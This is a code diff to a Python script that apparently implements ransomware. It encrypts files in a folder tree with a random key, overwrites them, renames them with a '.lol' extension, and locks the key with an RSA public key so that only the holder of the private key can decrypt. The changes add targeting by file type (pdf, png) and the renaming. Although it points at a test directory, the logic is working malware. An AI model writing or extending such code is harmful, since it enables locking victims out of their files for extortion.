@@ -13,15 +13,22 @@ randomKey = "".join(random.choices(alphabets, k = 128))
 
 ed = edFile(randomKey)
 
-def encrypt_folder(folder):
+def encrypt_folder(folder, Ftype = all):
 
 	def enc(folder):
 		contents = os.listdir(folder)
 		for c in contents:
 			f = os.path.join(folder, c)
 			if os.path.isfile(f):
-				e = ed.encrypt(f)
-				open(f, "wb").write(bytes(e, encoding = "utf-8"))
+				if Ftype == all:
+					e = ed.encrypt(f)
+					open(f, "wb").write(bytes(e, encoding = "utf-8"))
+					os.rename(f, f + ".lol")
+				else:
+					if f.split(".")[-1].lower() in Ftype:
+						e = ed.encrypt(f)
+						open(f, "wb").write(bytes(e, encoding = "utf-8"))
+						os.rename(f, f + ".lol")
 			else:
 				pass
 
@@ -36,10 +43,9 @@ def encryptKey():
 	ed.key = rsa.encrypt(randomKey.encode("utf8"), public_key)
 	randomKey = None
 
-def decrypt_folder(folder = None, privKey = None):
-	if privKey == None and folder == None:
+def decrypt_folder(folder = "../Test_dir", privKey = None):
+	if privKey == None:
 		privKey = keyInp.get()
-		folder = "../Test_dir"
 	if privKey != "":
 		try:
 			key = rsa.PrivateKey.load_pkcs1(open(privKey, "r").read().encode("utf8"))
@@ -52,9 +58,11 @@ def decrypt_folder(folder = None, privKey = None):
 			for c in contents:
 				f = os.path.join(folder, c)
 				if os.path.isfile(f):
-					e = open(f, "rb").read().decode()
-					d = ed.decrypt(e, key)
-					open(f, "wb").write(d)
+					if f.split(".")[-1] == "lol":
+						e = open(f, "rb").read().decode()
+						d = ed.decrypt(e, key)
+						open(f, "wb").write(d)
+						os.rename(f, f[:-4])
 				else:
 					decrypt_folder(f, privKey)
 		except FileNotFoundError:
@@ -67,7 +75,7 @@ if __name__ == "__main__":
 	if sys.argv[1] and sys.argv[1] == "d":
 		pass
 	elif sys.argv[1] == "r":
-		encrypt_folder("../Test_dir")
+		encrypt_folder("../Test_dir", ["pdf", "png"])
 		encryptKey()
 	else:
 		print("Incorrect option")
